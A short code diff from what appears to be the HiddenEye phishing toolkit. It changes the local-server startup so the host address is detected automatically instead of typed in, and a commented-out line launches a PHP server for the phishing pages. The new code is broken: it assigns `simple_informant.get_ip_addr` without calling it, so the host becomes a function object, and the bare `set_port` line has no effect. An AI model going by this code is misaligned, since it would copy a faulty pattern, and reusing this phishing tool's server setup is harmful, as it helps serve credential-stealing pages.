@@ -30,8 +30,10 @@ def start_localhost(port):
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
-    print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(default_palette[0], default_palette[4]))
-    host = input(" \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+    #print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(default_palette[0], default_palette[4]))
+    #host = input(" \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+    host = simple_informant.get_ip_addr
+    print("Your Localhost is {0}".format(host))
     set_port
     #run_command("cd Server/www/ 
     # && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
